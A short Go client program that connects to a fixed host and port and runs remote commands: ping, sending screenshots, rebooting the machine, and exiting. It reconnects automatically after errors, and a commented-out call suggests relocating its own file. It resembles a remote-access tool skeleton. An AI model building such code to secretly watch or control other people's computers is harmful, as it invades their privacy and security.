package main

import (
	"./serverDir"
	//"./fileReg"
	"time"

	"syscall"
	"fmt"
)
func main(){
	//start()
	//fileReg.Relocate()
	start_client()


}


var(
	specialFuncsAccess map[string]func() = make(map[string]func())
	clien *serverDir.Client = nil
)

func start_client(){
	defer revcovery()


	clien = serverDir.StartClient(2334, "LAPTOP-ARK617N3")
	clien.SetReadDeadline()
	specialFuncsAccess["ping"] = clien.Ping
	specialFuncsAccess["screen"] = clien.InitiateScrenShotSendingProcess
	specialFuncsAccess["reboot"] = clien.Reboot
	specialFuncsAccess["exit"] = func(){
		clien.Close()
		syscall.Exit(0)
	}
	for {
		content := string(clien.KeepReadingLinesUntilDelim(serverDir.KNOWN_DELIM))
		fmt.Println(content)
		if val, exists := specialFuncsAccess[content]; exists {
			val()
		} else {
			clien.Ignore()
		}

	}
	clien.Close()
	panic("DC")

}

func revcovery(){
	if r:=recover();r!=nil{
		if(clien!=nil){
			clien.Close()
		}
		time.Sleep(time.Second*1)
		start_client()
	}

}





